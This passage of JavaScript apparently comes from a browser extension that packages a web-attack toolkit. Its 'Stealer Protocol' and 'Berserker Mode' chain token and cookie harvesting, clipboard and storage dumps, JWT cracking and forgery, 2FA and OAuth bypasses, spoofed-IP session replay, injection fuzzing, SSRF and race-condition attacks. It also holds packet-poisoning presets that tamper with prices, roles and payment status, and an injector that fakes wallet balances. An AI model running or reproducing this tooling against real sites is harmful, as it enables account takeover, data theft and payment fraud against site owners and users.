      stLog(typeof r === 'string' ? r.slice(0, 150) : JSON.stringify(r).slice(0, 150), 'ok');
      return r;
    } catch (e) {
      stLog(`${label} failed: ${(e?.message || String(e)).slice(0, 100)}`, 'err');
      return null;
    }
  }

  document.getElementById('stStart')?.addEventListener('click', async () => {
    if (stRunning) { stLog('Already running — click ABORT first.', 'err'); return; }
    const pre = document.getElementById('stLog');
    if (pre) pre.textContent = '';
    stRunning = true;
    stAborted = false;

    const targetUrl = (document.getElementById('stUrl')?.value.trim()) || activeTabUrl;
    const replayUrl = (document.getElementById('stReplayUrl')?.value.trim()) || targetUrl;

    stLog('🕷️ STEALER PROTOCOL INITIATED — extracting everything...', 'phase');
    stLog(`Target: ${targetUrl}`);

    try {
      // ── PHASE 1: TOKEN HARVEST ────────────────────────────────────
      stPhase('Phase 1 — TOKEN HARVEST: Draining every auth artefact...', 'PH 1');
      await stRun('Find & decode all JWTs / auth tokens', () => TOOLS.find_tokens());
      if (stAborted) { stDone(false); return; }
      await stRun('Read hidden state (cookies, storage, globals, inputs)', () => TOOLS.read_hidden_state());
      await stRun('Session audit + cookie flag analysis', () => TOOLS.session_audit());
      await stRun('DOM XSS sink scan (source → sink paths)', () => TOOLS.dom_xss_scan());
      await stRun('CSRF token audit on all forms', () => TOOLS.csrf_check());
      await stRun('Service worker cache dump + IndexedDB scan', () => TOOLS.run_js({
        code: `
          const out = { sw: [], idb: [], clipboard: null };
          try {
            const regs = await navigator.serviceWorker.getRegistrations();
            out.sw = regs.map(r => ({ scope: r.scope, state: r.active?.state }));
          } catch {}
          try {
            out.dbList = await new Promise((res, rej) => {
              const req = indexedDB.databases ? indexedDB.databases() : Promise.resolve([]);
              (req.then ? req : Promise.resolve([])).then(res).catch(rej);
            });
          } catch {}
          try { out.clipboard = await navigator.clipboard.readText().catch(()=>'denied'); } catch {}
          try { out.cookies = document.cookie; } catch {}
          return out;
        `
      }));
      await stRun('Full DOM + window secret scan', () => TOOLS.run_js({
        code: `
          const out = {};
          try { out.localStorage = JSON.parse(JSON.stringify(localStorage)); } catch {}
          try { out.sessionStorage = JSON.parse(JSON.stringify(sessionStorage)); } catch {}
          try { out.globalKeys = Object.keys(window).filter(k => /token|auth|jwt|key|secret|api|pass|cred|user|session|admin|bearer|stripe|aws/i.test(k)).slice(0, 80); } catch {}
          try { out.metaTags = [...document.querySelectorAll('meta')].map(m=>({name:m.name,content:(m.content||'').slice(0,200)})).filter(m=>m.content); } catch {}
          try { out.hiddenInputs = [...document.querySelectorAll('input[type=hidden],input[name*="token"],input[name*="csrf"]')].map(i=>({name:i.name,value:i.value.slice(0,300)})); } catch {}
          try { out.scripts = [...document.querySelectorAll('script[src]')].map(s=>s.src).slice(0,30); } catch {}
          return out;
        `
      }));

      // ── PHASE 2: DEEP MEMORY DUMP ─────────────────────────────────
      if (stAborted) { stDone(false); return; }
      stPhase('Phase 2 — DEEP MEMORY DUMP: Extracting every secret from every file...', 'PH 2');
      await stRun('JS secret scan — 80+ patterns (80 files, max depth)', () => TOOLS.js_secret_scan({ maxFiles: 80 }));
      if (stAborted) { stDone(false); return; }
      await stRun('Sourcemap extraction (.map → original source code)', () => TOOLS.sourcemap_extract());
      await stRun('Dependency CVE check (OSV.dev database)', () => TOOLS.dep_cve_check());
      await stRun('Technology fingerprint (version/framework/infra leak)', () => TOOLS.tech_fingerprint({ url: targetUrl }));
      await stRun('Wayback Machine URL mining (archive.org + urlscan.io)', () => TOOLS.wayback_miner({
        domain: (() => { try { return new URL(targetUrl).hostname; } catch { return undefined; } })()
      }));
      await stRun('WebSocket monitor install (capture ws:// frames)', () => TOOLS.ws_fuzzer_setup());
      await stRun('Network traffic capture (auth endpoints in flight)', () => TOOLS.network_listener({ limit: 100 }));

      // ── PHASE 3: CREDENTIAL CRACK ─────────────────────────────────
      if (stAborted) { stDone(false); return; }
      stPhase('Phase 3 — CREDENTIAL CRACK: Breaking every auth layer...', 'PH 3');
      await stRun('JWT brute-force (200 common secrets via HMAC-SHA256)', () => TOOLS.jwt_cracker());
      if (stAborted) { stDone(false); return; }
      await stRun('JWT forgery (32+ variants — alg=none, role=admin, kid injection, jku/x5u)', () => TOOLS.auth_bypass_test({ url: targetUrl }));
      await stRun('OAuth bypass (redirect_uri open, state CSRF, token leakage)', () => TOOLS.oauth_bypass({ url: targetUrl }));
      await stRun('2FA bypass (23 null/injection/backup-code/NoSQL variants)', () => TOOLS.two_fa_bypass({ url: targetUrl }));
      await stRun('Open redirect test (60 redirect params)', () => TOOLS.open_redirect_test({ url: targetUrl }));
      await stRun('Prototype pollution (__proto__ via URL params)', () => TOOLS.proto_pollution_test({ url: targetUrl }));
      await stRun('Template injection (SSTI — Jinja2/Twig/Pebble/Freemarker)', () => TOOLS.payload_fuzz({ url: targetUrl, category: 'template', method: 'GET' }));
      await stRun('XXE injection (7 vectors — file read, SSRF, XInclude)', () => TOOLS.xxe_injection({ url: targetUrl, method: 'POST' }));

      // ── PHASE 4: SESSION CLONE ────────────────────────────────────
      if (stAborted) { stDone(false); return; }
      stPhase('Phase 4 — SESSION CLONE: Replaying session as ghost across IPs...', 'PH 4');
      await stRun('Replay authenticated session (real IP)', () => TOOLS.request_replay({ url: replayUrl, method: 'GET', credentials: 'include' }));
      if (stAborted) { stDone(false); return; }
      await stRun('Replay with spoofed IP (127.0.0.1 — localhost bypass)', () => TOOLS.request_replay({ url: replayUrl, method: 'GET', credentials: 'include', fakeIP: '127.0.0.1' }));
      await stRun('Replay with spoofed IP (10.0.0.1 — internal network)', () => TOOLS.request_replay({ url: replayUrl, method: 'GET', credentials: 'include', fakeIP: '10.0.0.1' }));
      await stRun('Replay with spoofed IP (192.168.1.1 — private subnet)', () => TOOLS.request_replay({ url: replayUrl, method: 'GET', credentials: 'include', fakeIP: '192.168.1.1' }));
      await stRun('Replay as POST with spoofed IP (body mutation)', () => TOOLS.request_replay({ url: replayUrl, method: 'POST', credentials: 'include', fakeIP: '127.0.0.1', body: '{}' }));
      await stRun('CORS misconfiguration (can attacker origin read response?)', () => TOOLS.cors_test({ url: targetUrl }));
      await stRun('Security headers audit (9 critical + 6 leak headers)', () => TOOLS.security_headers_check({ url: targetUrl }));
      await stRun('Mixed content / SRI (supply-chain attack vectors)', () => TOOLS.mixed_content_audit());
      await stRun('GraphQL introspection (full schema exposure check)', () => TOOLS.graphql_introspect({ base: targetUrl }));
      await stRun('SSRF advanced (35+ cloud/internal target probe)', () => TOOLS.ssrf_advanced({ url: targetUrl }));
      await stRun('WebSocket payload fuzz (send auth bypass payload)', () => TOOLS.ws_send_payload({ payload: '{"type":"auth","token":"null","admin":true}' }));

      // ── PHASE 5: EXFIL REPORT ─────────────────────────────────────
      if (stAborted) { stDone(false); return; }
      stPhase('Phase 5 — EXFIL REPORT: Compiling everything an attacker could steal...', 'PH 5');
      await stRun('Final form data + input dump', () => TOOLS.run_js({
        code: `
          const forms = [...document.querySelectorAll('form')].map(f => ({
            action: f.action, method: f.method,
            fields: [...f.elements].map(e => ({ name: e.name, type: e.type, value: (e.value || '').slice(0, 200) })).filter(e => e.name)
          }));
          const links = [...document.querySelectorAll('a[href]')].map(a => a.href).filter(h => h.includes('token') || h.includes('auth') || h.includes('session')).slice(0, 30);
          return { forms, suspiciousLinks: links };
        `
      }));
      await stRun('AI triage — severity ranking of all stolen data', () => TOOLS.triage_findings());
      await stRun('Export full HTML report (downloadable)', () => TOOLS.report_html());

      stLog('🕷️ STEALER PROTOCOL COMPLETE — check the report for everything an attacker could steal.', 'phase');
      stDone(true);
    } catch (e) {
      stLog('PROTOCOL ERROR: ' + (e?.message || String(e)), 'err');
      stDone(false);
    }
  });

  document.getElementById('stStop')?.addEventListener('click', () => {
    stAborted = true;
    stLog('⛔ ABORT signal sent — stopping after current step...', 'err');
  });
})();

// ============================================================
// Shadow-Bridge Berserker Mode
// ============================================================
(function () {
  let sbRunning = false;
  let sbAborted = false;

  function sbLog(msg, type) {
    const pre = document.getElementById('sbLog');
    if (!pre) return;
    const ts = new Date().toISOString().slice(11, 19);
    const prefix = type === 'ok' ? '✅' : type === 'err' ? '❌' : type === 'phase' ? '🩸' : '▸';
    pre.textContent += `[${ts}] ${prefix} ${msg}\n`;
    pre.scrollTop = pre.scrollHeight;
  }

  function sbPhase(name, badge) {
    const ind = document.getElementById('sbPhaseIndicator');
    const bdg = document.getElementById('sbPhaseBadge');
    if (ind) ind.textContent = name;
    if (bdg) { bdg.textContent = badge; bdg.style.background = '#4a0000'; bdg.style.color = '#ff6666'; }
    sbLog(name, 'phase');
  }

  function sbDone(success) {
    const ind = document.getElementById('sbPhaseIndicator');
    const bdg = document.getElementById('sbPhaseBadge');
    if (ind) ind.textContent = success ? '✅ BERSERKER COMPLETE — all phases done' : '⛔ ABORTED';
    if (bdg) { bdg.textContent = success ? 'DONE' : 'ABORTED'; bdg.style.background = success ? '#003300' : '#330000'; bdg.style.color = success ? '#33ff33' : '#ff4444'; }
    sbRunning = false;
  }

  async function runSafe(label, fn) {
    if (sbAborted) return null;
    try {
      sbLog(`Running: ${label}...`);
      const r = await fn();
      sbLog(typeof r === 'string' ? r.slice(0, 120) : JSON.stringify(r).slice(0, 120), 'ok');
      return r;
    } catch (e) {
      sbLog(`${label} failed: ${(e?.message || String(e)).slice(0, 100)}`, 'err');
      return null;
    }
  }

  document.getElementById('sbStart')?.addEventListener('click', async () => {
    if (sbRunning) { sbLog('Already running — click ABORT first.', 'err'); return; }
    const pre = document.getElementById('sbLog');
    if (pre) pre.textContent = '';
    sbRunning = true;
    sbAborted = false;

    const targetUrl = (document.getElementById('sbUrl')?.value.trim()) || activeTabUrl;
    const balUrl = (document.getElementById('sbBalUrl')?.value.trim()) || '';
    const balBody = (document.getElementById('sbBalBody')?.value.trim()) || '{"amount":{{amount}}}';

    sbLog('🩸 SHADOW-BRIDGE BERSERKER MODE ACTIVATED', 'phase');
    sbLog(`Target: ${targetUrl}`);

    try {
      // ── PHASE 1: SCOUT ─────────────────────────────────────────────
      sbPhase('Phase 1 — SCOUT: Mapping full attack surface...', 'PH 1');
      await runSafe('Network traffic capture (100 requests)', () => TOOLS.network_listener({ limit: 100 }));
      if (sbAborted) { sbDone(false); return; }
      await runSafe('Read hidden page state (cookies/storage/globals)', () => TOOLS.read_hidden_state());
      await runSafe('Find & decode tokens (early recon)', () => TOOLS.find_tokens());
      await runSafe('Hidden endpoint discovery (DEEP — 1000 paths)', () => TOOLS.discover_endpoints({ base: targetUrl, deep: true }));
      if (sbAborted) { sbDone(false); return; }
      try {
        const domain = new URL(targetUrl).hostname;
        await runSafe('Subdomain enumeration (150+ prefixes)', () => TOOLS.subdomain_finder({ domain }));
        await runSafe('Subdomain takeover check (16 services)', () => TOOLS.subdomain_takeover());
      } catch (_) {}
      if (sbAborted) { sbDone(false); return; }
      await runSafe('Auth-aware crawler (30 pages)', () => TOOLS.auth_crawler({ url: targetUrl, maxPages: 30 }));
      await runSafe('Technology fingerprint (stack/hosting/CDN)', () => TOOLS.tech_fingerprint({ url: targetUrl }));
      await runSafe('Wayback URL mining (archive.org + urlscan.io)', () => TOOLS.wayback_miner({ domain: (() => { try { return new URL(targetUrl).hostname; } catch { return undefined; } })() }));
      await runSafe('WebSocket monitor install', () => TOOLS.ws_fuzzer_setup());

      // ── PHASE 2: AUTH DESTROY ──────────────────────────────────────
      if (sbAborted) { sbDone(false); return; }
      sbPhase('Phase 2 — AUTH DESTROY: Cracking every session & token...', 'PH 2');
      await runSafe('Session audit (cookie flags + replay)', () => TOOLS.session_audit());
      await runSafe('JWT brute-force (200 common secrets)', () => TOOLS.jwt_cracker());
      await runSafe('JWT forge (32+ variants: alg=none/role=admin/kid inject)', () => TOOLS.auth_bypass_test({ url: targetUrl }));
      await runSafe('2FA/MFA bypass (23 null/injection variants)', () => TOOLS.two_fa_bypass({ url: targetUrl }));
      await runSafe('OAuth bypass (redirect_uri/state CSRF/token leak)', () => TOOLS.oauth_bypass({ url: targetUrl }));
      await runSafe('CSRF token audit (all forms)', () => TOOLS.csrf_check());
      await runSafe('Session replay with spoofed IP (127.0.0.1)', () => TOOLS.request_replay({ url: targetUrl, method: 'GET', credentials: 'include', fakeIP: '127.0.0.1' }));
      await runSafe('Session replay with spoofed IP (10.0.0.1)', () => TOOLS.request_replay({ url: targetUrl, method: 'GET', credentials: 'include', fakeIP: '10.0.0.1' }));
      await runSafe('Session replay with spoofed IP (192.168.1.1)', () => TOOLS.request_replay({ url: targetUrl, method: 'GET', credentials: 'include', fakeIP: '192.168.1.1' }));

      // ── PHASE 3: DB NUKE ──────────────────────────────────────────
      if (sbAborted) { sbDone(false); return; }
      sbPhase('Phase 3 — DB NUKE: Injecting every data pathway...', 'PH 3');
      await runSafe('SQL injection (45 payloads, error-based)', () => TOOLS.sql_fuzz({ url: targetUrl, method: 'GET', params: [] }));
      await runSafe('Blind time-based SQLi (MySQL/PG/MSSQL/Oracle/SQLite)', () => TOOLS.blind_sqli_test({ url: targetUrl, method: 'GET' }));
      await runSafe('Payload fuzz — SQL', () => TOOLS.payload_fuzz({ url: targetUrl, category: 'sql', method: 'GET' }));
      await runSafe('Payload fuzz — NoSQL', () => TOOLS.payload_fuzz({ url: targetUrl, category: 'nosql', method: 'GET' }));
      await runSafe('Payload fuzz — Template injection (SSTI)', () => TOOLS.payload_fuzz({ url: targetUrl, category: 'template', method: 'GET' }));
      await runSafe('Payload fuzz — LDAP injection', () => TOOLS.payload_fuzz({ url: targetUrl, category: 'ldap', method: 'GET' }));
      await runSafe('Payload fuzz — Command injection', () => TOOLS.payload_fuzz({ url: targetUrl, category: 'cmd', method: 'GET' }));
      await runSafe('GraphQL introspection (25+ paths)', () => TOOLS.graphql_introspect({ base: targetUrl }));
      await runSafe('XXE injection (7 vectors)', () => TOOLS.xxe_injection({ url: targetUrl, method: 'POST' }));

      // ── PHASE 4: LOGIC ANNIHILATE ─────────────────────────────────
      if (sbAborted) { sbDone(false); return; }
      sbPhase('Phase 4 — LOGIC ANNIHILATE: Crushing business logic...', 'PH 4');
      await runSafe('IDOR probe (ID increment/decrement ±500)', () => TOOLS.idor_test({ url: targetUrl }));
      await runSafe('Prototype pollution (__proto__ URL params)', () => TOOLS.proto_pollution_test({ url: targetUrl }));
      await runSafe('Logic flaw test (negative/zero/decimal/scientific prices)', () => TOOLS.logic_flaw_test({ url: targetUrl, method: 'POST', bodyTemplate: balBody }));
      await runSafe('Open redirect test (60 redirect params)', () => TOOLS.open_redirect_test({ url: targetUrl }));
      if (balUrl) {
        await runSafe('Balance attack (negative/decimal/type-confusion/NoSQL/IDOR)', () => TOOLS.balance_attack({ url: balUrl, method: 'POST', bodyTemplate: balBody }));
        await runSafe('Race condition burst — 100 parallel (TOCTOU)', () => TOOLS.race_condition_test({ url: balUrl, count: 100, method: 'POST', body: balBody.replace('{{amount}}', '1') }));
        await runSafe('Race condition burst — 50 parallel second wave', () => TOOLS.race_condition_test({ url: balUrl, count: 50, method: 'POST', body: balBody.replace('{{amount}}', '-1') }));
        await runSafe('Infra logic breaker (logic + race chained)', () => TOOLS.infra_logic_breaker({ url: balUrl, method: 'POST', bodyTemplate: balBody, count: 80 }));
      } else {
        await runSafe('Race condition burst — 100 parallel on target', () => TOOLS.race_condition_test({ url: targetUrl, count: 100, method: 'GET' }));
        await runSafe('Race condition burst — 50 parallel second wave', () => TOOLS.race_condition_test({ url: targetUrl, count: 50, method: 'POST' }));
      }

      // ── PHASE 5: INFRA CRUSH ──────────────────────────────────────
      if (sbAborted) { sbDone(false); return; }
      sbPhase('Phase 5 — INFRA CRUSH: Hammering infrastructure...', 'PH 5');
      await runSafe('WAF / CDN detection (28 vendor signatures)', () => TOOLS.waf_detect({ url: targetUrl }));
      await runSafe('SSRF advanced (35+ cloud/internal targets)', () => TOOLS.ssrf_advanced({ url: targetUrl }));
      await runSafe('SSRF via ssrfParam=url', () => TOOLS.ssrf_advanced({ url: targetUrl, ssrfParam: 'url' }));
      await runSafe('SSRF via ssrfParam=webhook', () => TOOLS.ssrf_advanced({ url: targetUrl, ssrfParam: 'webhook' }));
      await runSafe('HTTP request smuggling (TE/CL conflict + 3 more)', () => TOOLS.smuggling_test({ url: targetUrl }));
      await runSafe('Rate limit test — 200 rapid requests', () => TOOLS.rate_limit_test({ url: targetUrl, count: 200 }));
      await runSafe('TLS / HSTS audit (protocol + redirect + preload)', () => TOOLS.tls_audit({ url: targetUrl }));
      await runSafe('Clickjacking defense test (X-Frame + frame-ancestors)', () => TOOLS.clickjacking_test({ url: targetUrl }));
      await runSafe('Security headers audit (9 critical + 6 leak headers)', () => TOOLS.security_headers_check({ url: targetUrl }));
      await runSafe('CORS misconfiguration (reflected origin test)', () => TOOLS.cors_test({ url: targetUrl }));
      await runSafe('Mixed content / SRI (supply-chain vectors)', () => TOOLS.mixed_content_audit());
      await runSafe('WebSocket payload fuzz (SQL + XSS + proto)', () => TOOLS.ws_send_payload({ payload: '{"type":"test","data":"\' OR 1=1--"}' }));

      // ── PHASE 6: SECRETS DRAIN ────────────────────────────────────
      if (sbAborted) { sbDone(false); return; }
      sbPhase('Phase 6 — SECRETS DRAIN: Extracting every secret...', 'PH 6');
      await runSafe('JS secret scan — 80+ patterns (80 files max)', () => TOOLS.js_secret_scan({ maxFiles: 80 }));
      await runSafe('Sourcemap extraction (.map → original source)', () => TOOLS.sourcemap_extract());
      await runSafe('Dependency CVE check (OSV.dev)', () => TOOLS.dep_cve_check());
      await runSafe('DOM XSS sink scan (innerHTML/eval/document.write)', () => TOOLS.dom_xss_scan());
      await runSafe('XSS payloads on all forms', () => TOOLS.xss_test_all());
      await runSafe('Full JS memory dump (localStorage/sessionStorage/globals/hidden inputs)', () => TOOLS.run_js({
        code: `
          const out = {};
          try { out.localStorage = JSON.parse(JSON.stringify(localStorage)); } catch {}
          try { out.sessionStorage = JSON.parse(JSON.stringify(sessionStorage)); } catch {}
          try { out.globalKeys = Object.keys(window).filter(k => /token|auth|jwt|key|secret|api|pass|cred|user|session|admin/i.test(k)); } catch {}
          try { out.metaTags = [...document.querySelectorAll('meta[name*="token"],meta[name*="csrf"],meta[name*="key"]')].map(m=>({name:m.name,content:m.content.slice(0,200)})); } catch {}
          try { out.hiddenInputs = [...document.querySelectorAll('input[type=hidden]')].map(i=>({name:i.name,value:i.value.slice(0,200)})); } catch {}
          try { out.cookies = document.cookie; } catch {}
          return out;
        `
      }));

      // ── FINAL TRIAGE ──────────────────────────────────────────────
      if (sbAborted) { sbDone(false); return; }
      sbPhase('Final — AI Triage of all findings...', 'TRIAGE');
      await runSafe('AI severity triage', () => TOOLS.triage_findings());
      await runSafe('HTML report export', () => TOOLS.report_html());

      sbLog('🩸 ALL 6 PHASES COMPLETE — check AI Triage + Manual Toolbox log for full findings.', 'phase');
      sbDone(true);
    } catch (e) {
      sbLog('BERSERKER ERROR: ' + (e?.message || String(e)), 'err');
      sbDone(false);
    }
  });

  document.getElementById('sbStop')?.addEventListener('click', () => {
    sbAborted = true;
    sbLog('⛔ ABORT signal sent — stopping after current step...', 'err');
  });
})();

// ============================================================
// Packet Poisoning UI
// ============================================================
(function () {
  const ppRules = [];

  function ppRenderRules() {
    const el = document.getElementById('ppRulesList');
    if (!el) return;
    if (!ppRules.length) { el.innerHTML = '<span style="font-size:11px;color:#888">No rules yet — add one above.</span>'; return; }
    el.innerHTML = ppRules.map((r, i) =>
      `<div style="display:flex;align-items:center;gap:4px;margin:2px 0;font-size:11px">
        <code style="flex:1;background:#111;padding:2px 6px;border-radius:3px">${r.field} → ${r.value}</code>
        <span style="font-size:10px;color:#888">[${r.mode}]</span>
        <button onclick="window._ppRemoveRule(${i})" style="font-size:10px;padding:1px 6px;cursor:pointer">✕</button>
      </div>`
    ).join('');
  }

  window._ppRemoveRule = function (i) {
    ppRules.splice(i, 1);
    ppRenderRules();
  };

  function ppAddRule(field, value, mode) {
    if (!field) { status('Enter a field name', 'err'); return; }
    ppRules.push({ field: field.trim(), value: value.trim(), mode: mode || 'json_body' });
    ppRenderRules();
    const fn = document.getElementById('ppFieldName');
    const fv = document.getElementById('ppFieldValue');
    if (fn) fn.value = '';
    if (fv) fv.value = '';
  }

  const ppAddBtn = document.getElementById('ppAddRule');
  if (ppAddBtn) {
    ppAddBtn.addEventListener('click', () => {
      const field = (document.getElementById('ppFieldName')?.value || '').trim();
      const value = (document.getElementById('ppFieldValue')?.value || '').trim();
      const mode = document.getElementById('ppMode')?.value || 'json_body';
      ppAddRule(field, value, mode);
    });
  }

  document.querySelectorAll('.pp-preset').forEach((btn) => {
    btn.addEventListener('click', () => {
      const field = btn.dataset.field;
      const value = btn.dataset.value;
      const mode = btn.dataset.mode || 'json_body';
      const modeEl = document.getElementById('ppMode');
      if (modeEl) modeEl.value = mode;
      ppAddRule(field, value, mode);
      status(`Added poison rule: ${field} → ${value}`, 'ok');
    });
  });

  let _ppPoll = null;
  function ppStartPolling() {
    if (_ppPoll) return;
    _ppPoll = setInterval(async () => {
      try {
        const s = await bg({ type: 'GET_PACKET_POISON_STATE' });
        const log = document.getElementById('ppLog');
        if (log && s?.log) log.textContent = s.log.join('\n');
        if (!s?.active) ppStopPolling();
      } catch {}
    }, 1000);
  }
  function ppStopPolling() { if (_ppPoll) { clearInterval(_ppPoll); _ppPoll = null; } }

  const ppStartBtn = document.getElementById('ppStart');
  if (ppStartBtn) {
    ppStartBtn.addEventListener('click', async () => {
      if (!ppRules.length) { status('Add at least one poison rule first', 'err'); return; }
      const filter = (document.getElementById('ppFilter')?.value || '').trim();
      const mode = document.getElementById('ppMode')?.value || 'json_body';
      const { id } = await getActiveTab();
      status('Arming packet poisoner...', '');
      termWrite('running', `[PP] Starting Packet Poisoning: ${ppRules.length} rule(s), mode=${mode}, filter="${filter || '*'}"`);
      const r = await bg({ type: 'START_PACKET_POISON', tabId: id, rules: ppRules, urlFilter: filter, mode });
      if (r?.ok) {
        status('Packet poisoner active. Now trigger any action on the page.', 'ok');
        setAttached(true);
        ppStartPolling();
        termWrite('done', `[PP] Armed: ${ppRules.map(x => x.field + '→' + x.value).join(', ')}`);
      } else {
        status('Failed: ' + (r?.error || 'unknown'), 'err');
        termWrite('error', '[PP] Failed to arm: ' + (r?.error || 'unknown'));
      }
    });
  }

  const ppStopBtn = document.getElementById('ppStop');
  if (ppStopBtn) {
    ppStopBtn.addEventListener('click', async () => {
      await bg({ type: 'STOP_PACKET_POISON' });
      status('Packet poisoner stopped.', '');
      termWrite('done', '[PP] Packet Poisoner STOPPED');
      ppStopPolling();
    });
  }

  // NUKE ALL — loads every preset at once
  const nukeAllBtn = document.getElementById('ppNukeAll');
  if (nukeAllBtn) {
    nukeAllBtn.addEventListener('click', () => {
      const allPresets = [
        { field: 'price', value: '0.01', mode: 'json_body' },
        { field: 'price', value: '-999', mode: 'json_body' },
        { field: 'amount', value: '0', mode: 'json_body' },
        { field: 'amount', value: '-1', mode: 'json_body' },
        { field: 'quantity', value: '9999', mode: 'json_body' },
        { field: 'quantity', value: '-1', mode: 'json_body' },
        { field: 'role', value: '"admin"', mode: 'json_body' },
        { field: 'role', value: '"superuser"', mode: 'json_body' },
        { field: 'discount', value: '100', mode: 'json_body' },
        { field: 'user_id', value: '1', mode: 'json_body' },
        { field: 'is_premium', value: 'true', mode: 'json_body' },
        { field: 'is_admin', value: 'true', mode: 'json_body' },
        { field: 'is_verified', value: 'true', mode: 'json_body' },
        { field: 'trial_active', value: 'true', mode: 'json_body' },
        { field: 'subscription_tier', value: '"enterprise"', mode: 'json_body' },
        { field: 'payment_status', value: '"paid"', mode: 'json_body' },
        { field: 'tax', value: '0', mode: 'json_body' },
        { field: 'shipping_cost', value: '0', mode: 'json_body' },
        { field: 'debug', value: 'true', mode: 'json_body' },
        { field: 'age', value: '99', mode: 'json_body' },
        { field: 'coupon', value: '"FREESHIP"', mode: 'query_param' },
        { field: 'X-Forwarded-For', value: '127.0.0.1', mode: 'header_inject' },
        { field: 'X-Real-IP', value: '10.0.0.1', mode: 'header_inject' },
        { field: 'X-Admin-Token', value: 'true', mode: 'header_inject' },
      ];
      ppRules.length = 0;
      allPresets.forEach(p => ppRules.push(p));
      ppRenderRules();
      status('☠️ NUKE ALL — 24 poison rules loaded. Click Start Packet Poisoning.', 'ok');
    });
  }

  ppRenderRules();
})();

// ============================================================
// Live Response Rewriter UI (Financial Logic Synchronizer)
// ============================================================
function rrPreset(field, value) {
  $('#rrPattern').value = `"${field}"\\s*:\\s*[^,}\\]]+`;
  $('#rrReplace').value = `"${field}":${value}`;
}
const _rrBtn = (id) => document.getElementById(id);
if (_rrBtn('rrPreset1')) _rrBtn('rrPreset1').addEventListener('click', () => rrPreset('balance', 1000));
if (_rrBtn('rrPreset2')) _rrBtn('rrPreset2').addEventListener('click', () => rrPreset('credits', 9999));
if (_rrBtn('rrPreset3')) _rrBtn('rrPreset3').addEventListener('click', () => rrPreset('isPremium', 'true'));

if (_rrBtn('rrStart')) _rrBtn('rrStart').addEventListener('click', async () => {
  const pattern = $('#rrPattern').value.trim();
  const replacement = $('#rrReplace').value;
  const filter = $('#rrFilter').value.trim();
  if (!pattern) { status('Set a regex pattern first', 'err'); return; }
  try { new RegExp(pattern); } catch (e) { status('Bad regex: ' + e.message, 'err'); return; }
  const { id } = await getActiveTab();
  status('Starting live mutation...', '');
  termWrite('running', `Live Rewriter START on tab ${id}: ${pattern} → ${replacement} (filter: ${filter || '*'})`);
  const r = await bg({ type: 'START_REWRITER', tabId: id, urlFilter: filter,
    rules: [{ pattern, replacement, flags: 'g' }] });
  if (r?.ok) {
    status('Live mutation active. Refresh the target tab to see changes.', 'ok');
    setAttached(true);
    rrStartPolling();
  } else {
    status('Failed: ' + (r?.error || 'unknown'), 'err');
  }
});

if (_rrBtn('rrStop')) _rrBtn('rrStop').addEventListener('click', async () => {
  await bg({ type: 'STOP_REWRITER' });
  status('Live mutation stopped.', '');
  termWrite('done', 'Live Rewriter STOPPED');
  rrStopPolling();
});

let _rrPoll = null;
function rrStartPolling() {
  if (_rrPoll) return;
  _rrPoll = setInterval(async () => {
    try {
      const s = await bg({ type: 'GET_REWRITER_STATE' });
      const log = $('#rrLog');
      if (log && s?.log) log.textContent = s.log.join('\n');
      if (!s?.active) rrStopPolling();
    } catch {}
  }, 1500);
}
function rrStopPolling() { if (_rrPoll) { clearInterval(_rrPoll); _rrPoll = null; } }

// ============================================================
// Live Target Monitor (Active URL + balance polling)
// ============================================================
async function tmRefreshUrl() {
  try {
    const { url } = await getActiveTab();
    const el = $('#tmUrl');
    if (el && url) el.textContent = url.length > 64 ? url.slice(0, 61) + '...' : url;
  } catch {}
}

async function tmFetchBalance() {
  const path = ($('#tmBalanceUrl')?.value || '').trim();
  if (!path) { status('Enter a balance endpoint first', ''); return; }
  const stateEl = $('#tmState');
  const balEl = $('#tmBalance');
  if (stateEl) { stateEl.textContent = 'fetching...'; stateEl.className = 'tm-state busy'; }
  try {
    let url = path;
    if (!/^https?:\/\//.test(url)) {
      const t = await getActiveTab();
      url = new URL(path, t.url).toString();
    }
    const r = await bg({ type: 'RUN_FETCH', params: { url, method: 'GET', credentials: 'include' } });
    const body = String(r.body || r.data?.body || '');
    const m = body.match(/"(?:balance|credits|amount|coins|points|wallet)"\s*:\s*([\d.]+)/i);
    if (balEl) balEl.textContent = m ? m[1] : (body.length > 80 ? body.slice(0, 80) + '...' : body || '(empty)');
    if (stateEl) { stateEl.textContent = 'ok (' + r.status + ')'; stateEl.className = 'tm-state'; }
    termWrite('done', `[BAL] ${url} → ${r.status} → ${m ? m[1] : '(no balance field found)'}`);
  } catch (e) {
    if (stateEl) { stateEl.textContent = 'err: ' + e.message; stateEl.className = 'tm-state err'; }
  }
}
if (document.getElementById('tmRefresh')) {
  document.getElementById('tmRefresh').addEventListener('click', tmFetchBalance);
}

// === ⚡ FORCE BALANCE — one-click per-site interceptor ===
// 1. Arms the chrome.debugger Fetch-domain rewriter via background.
// 2. Injects the page-context fetch+XHR override from KNOWLEDGE_BASE so even
//    fetches that bypass the debugger (e.g. SW-cached, EventSource, HEAD-only)
//    still show the rewritten value.
async function tmForceBalance() {
  const stateEl = $('#tmState');
  try {
    const value = Number($('#tmForceValue')?.value || 1000) || 1000;
    const { id, url } = await getActiveTab();
    if (!id || !url) throw new Error('no active tab');
    const origin = new URL(url).origin;

    // Phase 1 — background-side debugger rewriter
    const armRes = await bg({ type: 'START_BALANCE_INTERCEPT', tabId: id, value });
    termWrite('final', `[FORCE] ✔ Debugger rewriter armed on ${origin} → value ${value} (${armRes?.message || 'ok'})`);

    // Phase 2 — page-context fetch/XHR override from the knowledge base
    if (typeof KNOWLEDGE_BASE !== 'undefined' && KNOWLEDGE_BASE.debuggerInterceptRecipe?.perSiteOverrideTemplate) {
      const fields = (KNOWLEDGE_BASE.debuggerInterceptRecipe.regexRulesForBalance || [])
        .map((r) => r.field);
      const code = KNOWLEDGE_BASE.debuggerInterceptRecipe.perSiteOverrideTemplate
        .replace(/\{value\}/g, String(value))
        .replace(/\{fields\}/g, JSON.stringify(fields))
        .replace(/\{origin\}/g, origin)
        .replace(/\{origin_json\}/g, JSON.stringify(origin));
      try {
        const [{ result }] = await chrome.scripting.executeScript({
          target: { tabId: id }, world: 'MAIN',
          func: new Function(code),
        });
        termWrite('final', `[FORCE] ✔ Page-context override injected on ${origin} → ${result || 'installed'}`);
      } catch (e) {
        termWrite('error', `[FORCE] page override failed: ${e.message}`);
      }
    }

    if (stateEl) { stateEl.textContent = `forced=${value}`; stateEl.className = 'tm-state'; }
    status(`⚡ Balance interceptor ARMED → ${value}. Now refresh the wallet page.`, 'ok');
  } catch (e) {
    termWrite('error', `[FORCE] failed: ${e.message}`);
